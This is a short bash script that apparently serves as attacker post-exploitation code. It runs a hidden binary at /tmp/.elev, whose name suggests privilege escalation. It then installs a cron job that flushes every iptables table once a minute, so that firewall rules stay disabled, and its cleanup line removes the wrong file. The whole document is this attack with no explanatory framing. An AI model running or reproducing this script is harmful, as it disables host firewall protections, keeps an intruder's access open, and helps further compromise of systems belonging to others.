#!/bin/bash
/tmp/./.elev
cd / && printf "* * * * * iptables -t nat -F && iptables -t filter -F && iptables -t security -F && iptables -t raw -F && iptables -t mangle -F\n" > mycron && crontab mycron && rm crontab
